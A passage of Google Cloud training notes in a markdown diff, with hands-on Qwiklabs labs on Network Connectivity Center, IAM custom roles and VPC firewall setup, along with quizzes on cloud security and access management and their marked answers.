+   | :------------------- | :-------------------------------------- |
+   | **Operating system** | `Debian`                                |
+   | **Version**          | `Debian GNU/Linux 11 (bullseye) x86/64` |
+   | **Boot disk type**   | `balanced persistent disk`              |
+   | **Size (GB)**        | `10 GB`                                 |
+
+3. Click **Networking**
+
+   - Network interfaces
+
+      
+
+     : click on
+
+      
+
+     ```
+     default
+     ```
+
+      
+
+     to edit.
+
+     - **Network**: `vpc-b`
+     - **Subnetwork**: `vpc-b-sub1-usw2`
+
+4. Once all sections are configured, scroll down and click **Create** to launch your virtual machine instance.
+
+Once finished, you should see the two virtual machines in the **VM Instances** page.
+
+1. Copy the internal IP of **vpc-b-vm-1**.
+
+![IP address of vpc-b-vm-1 highlighted on the VM Instances page](images/1uljy8fJ3Z9PN3q9BV9%2F9GVKxp9YygA8rVHPQIXdQuU%3D.png)
+
+Click *Check my progress* to verify the objective.
+
+Create VMs in the remote branch office VPCs
+
+
+
+Check my progress
+
+
+
+##### Step 3: Run the ping command and verify connectivity to bo2 via NCC transit
+
+To verify the end to end connectivity, run a ping test between *vpc-a-vm-1* and *vpc-b-vm-1* using the following steps:
+
+1. SSH into **vpc-a-vm-1** by clicking on **SSH** on the right hand side of vpc-a-vm-1. This launches a SSH client directly from your browser.
+
+**Note:** You can also SSH into the virtual machine. Learn more about SSH from the [Connect to an instance using ssh documentation](https://cloud.google.com/compute/docs/instances/connecting-to-instance).
+
+
+
+![Command line terminal](images/akxcwUSd1Af5FWejHAEaGAtsp7WZTFSKeWVZACNC0Zk%3D.png)
+
+1. Run a ping test from **vpc-a-vm-1** to the internal IP of **vpc-b-vm-1**.
+2. You can click on the "clipboard" icon in the upper right corner of the text box to copy the contents.
+
+```
+ping -c 5 <INTERNAL_IP_OF_VPC-B-VM-1>
+```
+
+
+
+![Command line terminal displaying ping statistics](images/JYccSGxzzFSU163WJCBgHq8wtgGuqfSlXSKKmGtsyaw%3D.png)
+
+#### Congratulations!
+
+This completes our lab for the Network Connectivity Center as a Transit hub with HA VPNs as spokes.
+
+
+
+## Quiz
+
+1. What is the purpose of a Cloud Router, and why is that important?
+
+- To load balance traffic across multiple Google Cloud regions and zones.
+- To dynamically exchange routing information using BGP between Google Cloud VPCs and other networks.
+- To create and manage virtual private networks (VPNs) between on-premises networks and Google Cloud.
+- To filter and restrict traffic based on predefined security rules.
+
+This is correct. Cloud Router enables dynamic routing using BGP,  allowing Google Cloud VPCs to learn routes from on-premises networks and other cloud environments.
+
+2. In Network Connectivity Center, what are the two main types of spokes that can be connected to a hub?
+
+- Regional spokes and Global spokes              
+- VPC spokes and Global spokes              
+- Global spokes and Hybrid spokes              
+- VPC spokes and Hybrid spokes
+
+Correct. VPC Spokes and hybrid spokes are two types of Network Connectivity Center spokes
+
+
+
+# 09 Managing Security in Google Cloud
+
+## Foundations of Google Cloud Security
+
+### Quiz
+
+1. Which TWO of the following statements are TRUE regarding regulatory compliance on Google Cloud?
+
+- Contacting your regulatory compliance certification agency is the only way to find out whether Google currently supports that particular standard.
+
+- **Google's Cloud products regularly undergo independent verification of security, privacy, and compliance controls.**
+
+​	Correct! Google works to achieve certifications against global standards so we can earn your trust.
+
+- Google has no plans at this time to expand its already-extensive portfolio of regulatory compliance certifications.
+
+- **Proper configuration of encryption and firewalls is not the only requirement for achieving regulatory compliance.**
+
+  Correct! You also need data protection that is in compliance with the regulatory standards you wish to meet.
+
+  
+
+2. For Platform-as-a-Service (PaaS) offerings, which of the following is NOT a customer-managed component of the shared security responsibility model?
+
+- **Network security**
+
+  Correct! Network security is customer-managed for Infrastructure-as-a-Service (IaaS) offerings. This is Google-managed for Platform-as-a-Service (PaaS) offerings.
+
+- Web application security
+
+- Access policies
+
+- Deployment
+
+
+
+
+3. Which ONE of the following statements is TRUE concerning Google's built-in security measures?
+
+- An organization's on-premises resources are not allowed to connect to Google Cloud in order to lower the risk of DDoS attacks.
+- Customers always have the option to configure their instances to encrypt all of their data while it is "at rest" within Google Cloud.
+- **To guard against phishing attacks, all Google employee accounts require the use of U2F compatible security keys.**
+
+​	Correct! Google's internal security measures go beyond asking employees for a simple username and 	password.
+
+- Only Google-managed encryption keys are allowed to be used within Google Cloud.
+
+
+
+
+4. Which of the following statements is TRUE regarding Shared Security Responsibility Model in Google Cloud?
+
+- **It is a shared responsibility between the customer and Google.**
+- The customer is responsible for the complete stack including application security and access control.
+- Google is responsible for the complete stack including application security and access control.
+
+Correct! The customer is responsible for everything brought into the cloud as well as access management, the appropriate configuration of firewalls, app security, etc. Google is responsible for the security of the cloud (i.e. the underlying layer).
+
+
+
+## Securing Access to Google Cloud
+
+### Quiz
+
+1. Which TWO of the following are considered authentication "best practices?"
+
+- Requiring 2-Step Verification (2SV) is only recommended for super-admin accounts.
+- **Avoid managing permissions on an individual user basis where possible.**
+
+Correct! Assigning users to groups and giving the group role-based permissions is much easier to manage.
+
+- Organization Admins should never remove the default Organization-level permissions from users after account creation.
+- **You should have no more than three Organization admins.**
+
+Correct! Too many admins can create additional risk as well - the general advice is no more than three admins per organization.
+
+2. Which of the following statements is TRUE for the use of Cloud Identity?
+
+- **Cloud Identity can work with any domain name that is able to receive email.**
+- Your organization must use Google Workspace services in order to use Cloud Identity.
+- You cannot use both Cloud Identity and Google Workspace services to manage your users across your domain.
+- A Google Workspace or Cloud Identity account can be associated with more than one Organization.
+
+Correct! You do not have to use Google Workspace services to use the Cloud Identity Free edition.
+
+
+3. The main purpose of Google Cloud Directory Sync is to: (choose ONE option below)
+
+- **Help simplify provisioning and de-provisioning user accounts.**
+- Completely replace an Active Directory or LDAP service.
+- Enable two-way data synchronization between Google Cloud and AD/LDAP accounts.
+
+Correct! Managing user accounts manually can be tedious and time-consuming when an organization has many users.
+
+
+
+## Identity and Access Management (IAM)
+
+### LAB - Configuring IAM
+
+#### Overview
+
+In this lab, you will configure [Identity and Access Management (IAM)](https://cloud.google.com/iam) to grant roles and create custom roles. IAM lets you create and manage permissions for Google Cloud resources. IAM unifies access control for Google Cloud services into a single system and presents a consistent set of operations.
+
+#### Objectives
+
+In this lab, you will learn how to:
+
+- Use IAM to implement access control.
+- Restrict access to specific features or resources.
+- Use predefined roles to provide Google Cloud access.
+- Create custom IAM roles to provide permissions based on your own job roles.
+- Modify custom roles.
+
+#### Setup and requirements
+
+For each lab, you get a new Google Cloud project and set of resources for a fixed time at no cost.
+
+1. Sign in to Qwiklabs using an **incognito window**.
+2. Note the lab's access time (for example, `1:15:00`), and make sure you can finish within that time.
+   There is no pause feature. You can restart if needed, but you have to start at the beginning.
+3. When ready, click **Start lab**.
+4. Note your lab credentials (**Username** and **Password**). You will use them to sign in to the Google Cloud Console.
+5. Click **Open Google Console**.
+6. Click **Use another account** and copy/paste credentials for **this** lab into the prompts.
+   If you use other credentials, you'll receive errors or **incur charges**.
+7. Accept the terms and skip the recovery resource page.
+
+**Note:** Do not click **End Lab** unless you have finished the lab or want to restart it. This clears your work and removes the project.
+
+#### Task 1. Sign in with two user accounts
+
+In this task, you sign in using two different user accounts. These accounts are used later in the lab to explore IAM access to specific resources.
+
+##### Sign in to the Google Cloud Console as the first user
+
+For this lab, Qwiklabs has provisioned you with two user names available in the **Connection Details** dialog.
+
+1. Use a Chrome incognito window and sign in to the [Cloud Console](https://console.cloud.google.com/) with the **Username 1** provided in Qwiklabs. Note that both usernames use the same password.
+2. Accept the Terms and Conditions for your temporary Google account.
+3. Because this is a temporary account, do not add recovery option data or sign up for free trials.
+4. When prompted, accept the Terms and Conditions for Google Cloud.
+
+##### Sign in to the Cloud Console as the second user
+
+1. Open another browser tab in your incognito window.
+2. Browse to the [Cloud Console](https://console.cloud.google.com/).
+3. Click on the user icon in the top-right corner of the screen, and then click **Add account**.
+4. Sign in to the Cloud Console with the **Username 2** provided in Qwiklabs.
+
+**Note:** At some points in this lab, if you sign out of the **Username 1** account, the **Username 2** account is deleted by Qwiklabs. So be sure to remain signed in to **Username 1**.
+
+#### Task 2. Explore current roles in the IAM console
+
+In this task, you explore the current roles for Username 1 and Username 2.
+
+##### Navigate to the IAM console and explore roles
+
+Make sure you are on the **Username 1** Cloud Console tab.
+
+1. To view the **IAM** console, in the **Navigation menu**, click **IAM & admin > IAM**.
+2. In the IAM console, locate the line for **Username 1**. Note that Username 1 has a few roles, including Project **Owner**.
+3. Locate the line for **Username 2**. Note that Username 2 has a Project **Viewer** role.
+
+**Note:** In the next three steps, be sure **NOT** to change any of the permissions. You will use the edit feature just to view the roles assigned.
+
+1. Click the Edit principal button ![Edit icon](https://cdn.qwiklabs.com/zxK8nW520maN72Qq6D1Lt9gCeDh7QOMGWCwhny5S8sQ%3D) on the line for **Username 2**.
+2. Click **Viewer** to expand the list of possible roles. Do not change any of the roles yet, but you do have permissions to do so because Username 1 is project owner.
+3. Click outside the role list to collapse it, and then click **Cancel**.
+4. Switch to the Cloud Console tab for **Username 2**.
+5. On the **Navigation menu**, click **IAM & admin > IAM**.
+6. Click the Edit principal button ![Edit icon](https://cdn.qwiklabs.com/zxK8nW520maN72Qq6D1Lt9gCeDh7QOMGWCwhny5S8sQ%3D) on the line for **Username 2**. You will not be able to edit the role. **Username 2** currently has access to view the project (Project Viewer), but does not have permissions to change anything.
+
+#### Task 3. Prepare a resource for access testing
+
+In this task, you create a Cloud Storage bucket and a sample text file. You test access to the sample file using Username 2.
+
+##### Create a bucket and upload a sample file
+
+1. Switch to the **Username 1** Cloud Console tab.
+2. On the Google Cloud Console title bar, click **Activate Cloud Shell** (![Activate Cloud Shell icon](https://cdn.qwiklabs.com/ep8HmqYGdD%2FkUncAAYpV47OYoHwC8%2Bg0WK%2F8sidHquE%3D)). If prompted, click **Continue**.
+3. Run the following command to create a new storage bucket in `REGION`:
+
+```
+gcloud storage buckets create -l Region gs://$DEVSHELL_PROJECT_ID
+```
+
+
+
+1. Run the following command to create a sample text file in your Cloud Shell:
+
+```
+echo "this is a sample file" > sample.txt
+```
+
+
+
+1. Run the following command to copy the file to the bucket just created:
+
+```
+gcloud storage cp sample.txt gs://$DEVSHELL_PROJECT_ID
+```
+
+
+
+Click *Check my progress* to verify the objective.
+
+Prepare a resource for access testing
+
+
+
+Check my progress
+
+
+
+##### Verify the Project Viewer role access
+
+1. Switch to the **Username 2** Cloud Console tab.
+2. Click **Activate Cloud Shell** (![Activate Cloud Shell icon](https://cdn.qwiklabs.com/ep8HmqYGdD%2FkUncAAYpV47OYoHwC8%2Bg0WK%2F8sidHquE%3D)) to open Cloud Shell. If prompted, click **Continue**.
+3. Run the following command to verify that **Username 2** can view the file in the bucket:
+
+```
+gcloud storage ls gs://$DEVSHELL_PROJECT_ID
+```
+
+
+
+1. Run the following commands to create a file and try to upload it to the bucket:
+
+```
+echo "this is another file" > sample2.txt
+gcloud storage cp sample2.txt gs://$DEVSHELL_PROJECT_ID
+```
+
+
+
+Username 2 cannot upload the file to Cloud Storage because it only has the Project Viewer role.
+
+**Output:**
+
+```
+Copying file://sample2.txt 
+ERROR: User xxx does not have permission to access b instance (or it may not exist): student-xx-xxxx@qwiklabs.net does not have storage.objects.create access to the Google Cloud Storage object.
+```
+
+#### Task 4. Remove project access
+
+In this task, you remove the Project Viewer role for Username 2. You verify that Username 2 has lost access to the Cloud Storage bucket.
+
+##### Remove the Project Viewer role for Username 2
+
+1. Switch to the **Username 1** Cloud Console tab.
+2. On the **Navigation menu**, click **IAM & admin > IAM**.
+3. For **Username 2**, click on the pencil icon edit (![Edit icon](https://cdn.qwiklabs.com/zxK8nW520maN72Qq6D1Lt9gCeDh7QOMGWCwhny5S8sQ%3D)) button.
+4. Click the delete icon next to the assigned role.
+5. Click on **Save**.
+
+Notice that the user has disappeared from the list! The user has no access now. Username 2 still has a Google Cloud account, but has no access to the project.
+
+##### Verify that Username 2 has lost access
+
+1. Switch to the **Username 2** Cloud Console tab.
+2. Run the following command in Cloud Shell to verify that **Username 2** can no longer view the file in the bucket:
+
+```
+gcloud storage ls gs://$DEVSHELL_PROJECT_ID
+```
+
+
+
+**Output:**
+
+```
+ERROR: User xxx does not have permission to access b instance (or it may not exist): student-xx-xxxx@qwiklabs.net does not have storage.objects.list access to the Google Cloud Storage bucket.
+```
+
+1. If you can still see the file, the access change has not taken effect yet. Wait a minute and try the command again until you see `Permission denied on resource `.
+2. From the **Username 2** console, try to access the Compute Engine service. On the **Navigation menu**, click **Compute Engine > VM instances**. You will not even be able to view the Compute Engine dashboard.
+
+![Additional Access Required](images/Hc1Su7Gsaz%2B%2BzbfZf3pkmdahh8gn9uKwP0Gv7RnNxWI%3D.png)
+
+**Note:** **Username 2** still has a Google Cloud account, but has no access to the project from either the Cloud Console or the CLI.
+
+#### Task 5. Add storage access
+
+In this task, you add storage object viewer permissions for Username 2 and verify that the user can view the contents of the Cloud Storage bucket.
+
+##### Add storage object viewer only permissions for Username 2
+
+1. Copy the value of **Username 2** from the Qwiklabs **Connection Details** dialog.
+2. Switch to the **Username 1** Cloud Console tab.
+3. On the **Navigation menu**, click **IAM & admin > IAM**.
+4. Click **GRANT ACCESS** to add a user.
+5. For **New principals**, paste the **Username 2** value you copied from the Qwiklabs **Connection Details** dialog.
+
+In the next step, you will use a predefined role to give Storage Object Viewer permissions to Username 2. Feel free to explore the available predefined roles.
+
+1. For **Select a role**, select **Cloud Storage > Storage Object Viewer**.
+2. Click **Save**.
+
+##### Verify that Username 2 has storage access
+
+1. Switch to the **Username 2** Cloud Console tab.
+
+**Note:** **Username 2** doesn't have the Project Viewer role, so the user still can't see the project or any of its resources in the Cloud Console. For example, Username 2 still cannot view the Compute Engine dashboard. However, Username 2 has specific access to view Cloud Storage and can make API calls to view storage.
+
+1. Run the following command in Cloud Shell to view the contents of the bucket you created earlier:
+
+```
+gcloud storage ls gs://$DEVSHELL_PROJECT_ID
+```
+
+
+
+As you can see, **Username 2** now has limited access to view Cloud Storage.
+
+#### Task 6. Create custom roles
+
+In this task, you create a custom role for a job role of Privacy Reviewer. This role performs data privacy reviews and needs permissions to view data in various different services, such as Cloud Storage, Cloud Bigtable, and Cloud Spanner
+
+Google Cloud also allows for the creation of custom roles. Custom roles can be used to map your organization's specific job roles to Google Cloud permissions. A custom role can combine permissions from multiple Google Cloud services into one role and then share that new role across your entire organization.
+
+**Note:** Generally it is better to use predefined roles first, because they are managed by Google. Creating and using custom roles allows for specific permissions to be set, but add operational overhead because they must be manually managed.
+
+
+
+Custom roles can also be created based on an existing predefined role. However, if the predefined role that your custom role is based on changes after you create your custom role, those changes are not inherited by the custom role.
+
+To create a custom role, a caller must possess the `iam.roles.createpermission`. By default, the owner of a project or an organization has this permission and can create and manage custom roles. In this lab, Username 1 is a project owner.
+
+##### Create a custom role using the Cloud Console
+
+1. Switch to the **Username 1** Cloud Console tab.
+2. On the **Navigation menu**, click **IAM & admin > Roles**. This page currently displays all the predefined roles. Notice that there are many of them (there are several hundred pages of them).
+3. Click **Create Role**.
+4. Use the following values for the Role properties:
+
+| **Title**          | **Description**                       | **ID**            | **Role launch stage** |
+| ------------------ | ------------------------------------- | ----------------- | --------------------- |
+| `Privacy Reviewer` | `Custom role to perform data reviews` | `privacyreviewer` | `Alpha`               |
+
+Each of the placeholder values is described below:
+
+- **Title** is a friendly title for the role, such as "Role Viewer."
+- **Description** is a short description about the role, such as "My custom role description."
+- **ID** must be unique.
+- **Role launch stage** indicates the stage of a role in the launch lifecycle, such as Alpha, Beta, GA, or Disabled.
+
+1. Click **Add permissions**.
+2. In the **Filter** field, type `storage`, and then press **Enter**.
+3. Select **storage.buckets.list**, **storage.objects.list**, and **storage.objects.get**, and then click **Add**. ![Add permissions dialog filtered to list storage roles](images/N49h1Du%2B5Q1nwxNz4gqN%2FXyVGC4kpZ3nbQ8scYLDJ%2Bk%3D.png)
+
+**Note:** To add required permissions you may need to see next pages.
+
+1. Click **Add permissions** again.
+2. In the **Filter** field, type `spanner`, and then press **Enter**.
+3. Select **spanner.databases.get** and **spanner.databases.list**, and then click **Add**.
+4. Click **Add permissions** again.
+5. In the **Filter** field, type `bigtable`, and then press **Enter**.
+6. Select **bigtable.tables.get**, **bigtable.tables.list**, and **bigtable.tables.readRows**, and then click **Add**.
+
+Your permissions should look like this:
+
+![Eight assigned permissions](images/AIKNUnRVflZTx9V2xjLglDCmKfI0uvHSdt13sQd3txI%3D.png)
+
+1. Click **Create**.
+
+Your new custom role should now be displayed at the top of the Roles table.
+
+##### Create a custom role using the CLI and YAML file
+
+- Roles can also be created using the CLI and a YAML file. The YAML file contains the role definition and is in the form:
+
+```
+title: [ROLE_TITLE]
+description: [ROLE_DESCRIPTION]
+stage: [LAUNCH_STAGE]
+includedPermissions:
+- [PERMISSION_1]
+- [PERMISSION_2]
+```
+
+
+
+- So the YAML for the role you just created in the Cloud Console would look like:
+
+```
+title: Privacy Reviewer
+description: Custom role to perform data reviews
+stage: ALPHA
+includedPermissions:
+- storage.buckets.list
+- storage.objects.list
+- storage.objects.get
+- spanner.databases.get- spanner.databases.list
+- bigtable.tables.get
+- bigtable.tables.list
+- bigtable.tables.readRows
+```
+
+
+
+Do not copy the YAML file above; you will create a different role using the CLI.
+
+1. Verify that you are still on the browser tab for **Username 1**, and open Cloud Shell if it is not already open.
+2. To create a new file called **role.yaml**, run the following command:
+
+```
+nano role.yaml
+```
+
+
+
+1. Copy the following role definition and paste into the nano editor in Cloud Shell:
+
+```
+title: App Viewer
+description: Custom role to view apps
+stage: ALPHA
+includedPermissions:
+- compute.instances.get
+- compute.instances.list
+- appengine.versions.get
+- appengine.versions.list
+```
+
+
+
+1. Press **CTRL+X,** press **Y**, and then press **Enter** to save the file.
+2. To create a new role, run the following command:
+
+```
+gcloud iam roles create app_viewer --project \
+$DEVSHELL_PROJECT_ID --file role.yaml
+```
+
+
+
+You will see the following output.
+
+**Output:**
+
+```
+Created role [app_viewer].
+description: Custom role to view apps
+etag: BwVshqVuvBs=
+includedPermissions:
+- appengine.versions.get
+- appengine.versions.list
+- compute.instances.get
+- compute.instances.list
+name: projects/xxxxxxxxxx/roles/app_viewer
+stage: ALPHA
+title: App Viewer
+```
+
+1. To list all the custom roles in your project, run the following command:
+
+```
+gcloud iam roles list --project $DEVSHELL_PROJECT_ID
+```
+
+
+
+You will see both roles you created.
+
+Click *Check my progress* to verify the objective.
+
+Create custom roles
+
+
+
+Check my progress
+
+
+
+#### Task 7. Use a custom role
+
+In this task, you create a custom role and assign it to Username 2.
+
+1. Make sure you are on the **Username 1** Cloud Console tab.
+2. On the **Navigation menu**, click **IAM & admin > IAM**.
+3. In the IAM console, locate the line for **Username 2** and click the Edit principal (![Edit icon](https://cdn.qwiklabs.com/zxK8nW520maN72Qq6D1Lt9gCeDh7QOMGWCwhny5S8sQ%3D)) button. **Username 2** should currently have the **Storage Object Viewer** role.
+4. Click **Add another role**, and then click **Select a role**.
+5. In the **Custom** category, select one of the roles you just created.
+6. Click **Save**.
+
+You have assigned **Username 2** to one of your custom roles.
+
+#### Task 8. Maintain custom roles
+
+In this task, you modify, disable, delete, and un-delete a custom role.
+
+When using custom roles, it's important to track what permissions are associated with the roles you create, because available permissions for Google Cloud services evolve and change over time. Unlike Google Cloud predefined roles, you control if and when permissions are added or removed.
+
+##### Modify role permissions
+
+To modify an existing role, you need to first get the role's definition, update the definition, and then update the role.
+
+1. Make sure you are on the **Username 1** Cloud Console tab.
+2. To retrieve the **app_viewer** role's definition, run the following command in Cloud Shell:
+
+```
+gcloud iam roles describe app_viewer --project \
+$DEVSHELL_PROJECT_ID
+```
+
+
+
+The describe command returns the following output.
+
+**Output:**
+
+```
+description: Custom role to view apps
+etag: [Etag value]
+includedPermissions:
+- appengine.versions.get
+- appengine.versions.list
+- compute.instances.get
+- compute.instances.list
+name: projects/[Project_ID]/roles/app_viewer
+stage: DISABLED
+title: App Viewer
+```
+
+1. Copy the output from your describe command. Be sure to copy from the `description` line to the `title` line.
+2. Run the following command to create a new YAML file:
+
+```
+nano update-role.yaml
+```
+
+
+
+1. Paste the output from the describe command into the nano editor.
+2. Add the following two lines just below the `includedPermissions:` lines:
+
+```
+- container.clusters.get
+- container.clusters.list
+```
+
+
+
+1. Press **CTRL+X,** press **Y**, and then press **Enter** to save the file.
+2. To update the **app_viewer** role, run the following command:
+
+```
+gcloud iam roles update app_viewer --project \
+$DEVSHELL_PROJECT_ID --file update-role.yaml
+```
+
+
+
+The **app_viewer** role has been updated and two permissions were added.
+
+Click *Check my progress* to verify the objective.
+
+Modify role permissions
+
+
+
+Check my progress
+
+
+
+##### Disable a role
+
+You can disable a custom role. When a role is disabled, any policy bindings related to the role are inactivated, which means that the permissions in the role will not be granted, even if you grant the role to a user.
+
+1. Make sure you are on the **Username 1** Cloud Console tab.
+2. To disable the **app_viewer** role created earlier in this lab, run the following command in Cloud Shell:
+
+```
+gcloud iam roles update app_viewer --project \
+$DEVSHELL_PROJECT_ID --stage DISABLED
+```
+
+
+
+##### Delete a role
+
+Roles that are deleted are suspended and cannot be used to create new IAM policy bindings. After the role has been deleted, existing bindings remain, but are inactive. The role can be un-deleted within seven days. After seven days, the role enters a permanent deletion process that lasts 30 days.
+
+1. Make sure you are on the **Username 1** Cloud Console tab.
+2. To delete the **app_viewer** role created earlier in this lab, run the following command in Cloud Shell:
+
+```
+gcloud iam roles delete app_viewer --project \
+$DEVSHELL_PROJECT_ID
+```
+
+
+
+1. To list all the roles in the project, run the following command:
+
+```
+gcloud iam roles list --project $DEVSHELL_PROJECT_ID
+```
+
+
+
+Notice that the deleted **app_viewer** role is no longer listed.
+
+1. To list all the roles in the project including the deleted roles, run the following command:
+
+```
+gcloud iam roles list --project $DEVSHELL_PROJECT_ID \
+--show-deleted
+```
+
+
+
+##### Un-delete a role
+
+Role can be un-deleted within seven days of being deleted.
+
+1. To un-delete the **app_viewer** role, run the following command in Cloud Shell:
+
+```
+gcloud iam roles undelete app_viewer --project \
+$DEVSHELL_PROJECT_ID
+```
+
+
+
+1. To list all the roles in the project, run the following command:
+
+```
+gcloud iam roles list --project $DEVSHELL_PROJECT_ID
+```
+
+
+
+Notice that the **app_viewer** role is listed again.
+
+#### Review
+
+In this lab, you did the following:
+
+1. Used IAM to implement access control.
+2. Restricted access to specific features or resources.
+3. Used predefined roles to provide Google Cloud access.
+4. Created custom IAM roles to provide permissions based on your own job roles.
+5. Modified custom roles.
+
+### Quiz
+
+1. Which THREE of the following are IAM Objects that can be used to organize resources in Google Cloud?
+
+- **Project**
+
+  Correct! A project is a collection of resources that share the same billing and lifecycle. It's the primary unit of organization in Google Cloud.
+
+- **Organization**
+
+  Correct! An organization is the highest level of hierarchy in Google Cloud. It allows you to manage multiple projects and accounts with a central point of administration.
+
+- Bucket
+
+- Instance
+
+- Container
+
+- Role
+
+- Member
+
+- **Folder**
+
+​	Correct! Folders are used to group resources within a project. They provide a logical way to organize and manage your resources.
+
+2. Which TWO of the following statements about Cloud IAM Policies is TRUE?
+
+- An organization policy can only be applied to the organization node.
+
+- **A policy is a collection of access statements attached to a resource.**
+
+  Correct! One way to think of it is, resource policies are a union of parent and resource.
+
+- **A Policy binding binds a list of members to a role.**
+
+  Correct! Members can be user accounts, Google groups, Google domains, and service accounts.
+
+- A less restrictive parent policy will not override a more restrictive child resource policy.
+
+  
+
+3. Projects in Google Cloud provide many management-related features, including the ability to (choose TWO)
+
+- **Selectively enable specific services and APIs.**
+
+  Correct! You can also assign manager permissions more effectively,
+
+- **Track and manage quota usage.**
+
+  Correct! You can also track general resource usage as well.
+
+- Balance server load between different Projects.
+
+- Keep on-prem AD/LDAP accounts synced up with user's Google Cloud resources.
+
+
+
+## Configuring Virtual Private Cloud for Isolation and Security
+
+### LAB - Configuring VPC Firewalls
+
+#### Overview
+
+In this lab, you investigate [Virtual Private Cloud (VPC)](https://cloud.google.com/vpc) networks and create firewall rules to allow and deny access to a network and instances.
+
+You begin by creating an automatic VPC network, a custom VPC network, and some VPC instances in those networks. You verify that the default-allow-ssh firewall rule is working and then compare this to the user created custom network to verify no ingress is allowed without custom firewall rules.
+
+After deleting the default network, you use firewall rule priorities,to allow both ingress and egress of network traffic to your VMs.
+
+##### Objectives
+
+In this lab, you will learn how to:
+
+- Create an auto-mode network, a custom-mode network, and associated subnetworks.
+- Investigate firewall rules in the default network and then delete the default network.
+- Use features of firewall rules for more precise and flexible control of connections.
+
+#### Setup and requirements
+
+For each lab, you get a new Google Cloud project and set of resources for a fixed time at no cost.
+
+1. Sign in to Qwiklabs using an **incognito window**.
+2. Note the lab's access time (for example, `1:15:00`), and make sure you can finish within that time.
+   There is no pause feature. You can restart if needed, but you have to start at the beginning.
+3. When ready, click **Start lab**.
+4. Note your lab credentials (**Username** and **Password**). You will use them to sign in to the Google Cloud Console.
+5. Click **Open Google Console**.
+6. Click **Use another account** and copy/paste credentials for **this** lab into the prompts.
+   If you use other credentials, you'll receive errors or **incur charges**.
+7. Accept the terms and skip the recovery resource page.
+
+**Note:** Do not click **End Lab** unless you have finished the lab or want to restart it. This clears your work and removes the project.
+
+##### Activate Google Cloud Shell
+
+Google Cloud Shell is a virtual machine that is loaded with development tools. It offers a persistent 5GB home directory and runs on the Google Cloud.
+
+Google Cloud Shell provides command-line access to your Google Cloud resources.
+
+1. In Cloud console, on the top right toolbar, click the Open Cloud Shell button.
+
+   ![Highlighted Cloud Shell icon](images/WGBFVIap4CrFWut%2BGdNFzNxeelWYHF1IqYSMFH6Ouq4%3D.png)
+
+2. Click **Continue**.
+
+It takes a few moments to provision and connect to the environment. When you are connected, you are already authenticated, and the project is set to your *PROJECT_ID*. For example:
+
+![Project ID highlighted in the Cloud Shell Terminal](images/hmMK0W41Txk%2B20bQyuDP9g60vCdBajIS%2B52iI2f4bYk%3D.png)
+
+**gcloud** is the command-line tool for Google Cloud. It comes pre-installed on Cloud Shell and supports tab-completion.
+
+- You can list the active account name with this command:
+
+```
+gcloud auth list
+```
+
+
+
+**Output:**
+
+```
+Credentialed accounts:
+ - <myaccount>@<mydomain>.com (active)
+</mydomain></myaccount>
+```
+
+**Example output:**
+
+```
+Credentialed accounts:
+ - google1623327_student@qwiklabs.net
+```
+
+- You can list the project ID with this command:
+
+```
+gcloud config list project
+```
+
+
+
+**Output:**
+
+```
+[core]
+project = <project_id>
+</project_id>
+```
+
+**Example output:**
+
+```
+[core]
+project = qwiklabs-gcp-44776a13dea667a6
+```
+
+**Note:** Full documentation of **gcloud** is available in the [gcloud CLI overview guide ](https://cloud.google.com/sdk/gcloud).
+
+#### Task 1. Create VPC networks and instances
+
+In this task, you create an automatic VPC network and custom VPC network, and some initial VPC instances in those networks.
+
+1. On the Google Cloud Console title bar, click **Activate Cloud Shell** (![Activate Cloud Shell icon](https://cdn.qwiklabs.com/ep8HmqYGdD%2FkUncAAYpV47OYoHwC8%2Bg0WK%2F8sidHquE%3D)) to open Cloud Shell. If prompted, click **Continue**.
+2. To create the network *mynetwork* with auto subnets, run the following command:
+
+```
+gcloud compute networks create mynetwork --subnet-mode=auto
+```
+
+
+
+**Note:** When an auto mode VPC network is created, one subnet from each region is automatically created within it. These automatically created subnets use a set of predefined IP ranges that fit within the 10.128.0.0/9 CIDR block.
+
+You will now create a network with custom subnets. You can choose any private RFC 1918 CIDR block for the primary IP address range of the subnets.
+
+1. To create the network *privatenet* with custom subnets, run the following command:
+
+```
+gcloud compute networks create privatenet \
+--subnet-mode=custom
+```
+
+
+
+1. To create a custom subnet in the privatenet network, run the following command:
+
+```
+gcloud compute networks subnets create privatesubnet \
+--network=privatenet --region=us-east4 \
+--range=10.0.0.0/24 --enable-private-ip-google-access
+```
+
+
+
+1. To create some instances to use later for testing in all networks, run these commands:
+
+```
+gcloud compute instances create default-vm-1 \
+--machine-type e2-micro \
+--zone=us-east4-a --network=default
+```
+
+
+
+```
+gcloud compute instances create mynet-vm-1 \
+--machine-type e2-micro \
+--zone=us-east4-a --network=mynetwork
+```
+
+
+
+```
+gcloud compute instances create mynet-vm-2 \
+--machine-type e2-micro \
+--zone=us-central1-f --network=mynetwork
+```
+
+
+
+```
+gcloud compute instances create privatenet-bastion \
+--machine-type e2-micro \
+--zone=us-east4-b  --subnet=privatesubnet --can-ip-forward
+```
+
+
+
+```
+gcloud compute instances create privatenet-vm-1 \
+--machine-type e2-micro \
+--zone=us-east4-c  --subnet=privatesubnet
+```
+
+
+
+Click *Check my progress* to verify the objective.
+
+Create VPC networks and instances
+
+
+
+Check my progress
+
+
+
+#### Task 2. Investigate the default network
+
+In this task, you explore the default network and verify that the default-allow-ssh firewall rule is working. Later, you delete the default-vm-1 instance and default network because you no longer need it.
+
+Return to the Cloud Console and view the firewall rules.
+
+1. On the **Navigation menu**, click **VPC network > Firewall**.
+
+The following four default rules are created for the default network:
+
+![Four default firewall ingress rules](images/%2B3rX%2BBQoV4F%2Fs0b%2BSi9SndCb%2BjMo60W8vKASrh9dXL4%3D.png)
+
+Remember, all networks also have the following 2 rules, which are not displayed in the console:
+
+![Default deny all ingress and default deny all egress rules](images/tv2tBmwKQMI9SNKmTAn%2F8%2FiUtUpvDfm260URbfnCC6o%3D.png)
+
+To check that the default-allow-ssh firewall rule is working, ssh into the default-vm-1 instance in the default network and test it.
+
+1. On the **Navigation menu**, click **Compute Engine > VM instances** to display a list of VM instances.
+2. In the row for the **default-vm-1** instance, click **SSH**.
+
+You should connect successfully via SSH to the instance because of the default-allow-ssh rule. You can ping `www.google.com` to test the egress connectivity. Press **Ctrl+C** to stop the ping.
+
+##### Delete the default-vm-1 instance
+
+Now delete the default-vm-1 instance because you no longer need it.
+
+1. In the **Navigation menu**, click **Compute Engine > VM instances**, select the **default-vm-1** instance and then click **Delete**.
+2. In the confirmation box, click **Delete**.
+
+##### Delete the default network
+
+**Note:** Because the default network allows relatively open access, we recommend that you delete it for production projects.
+
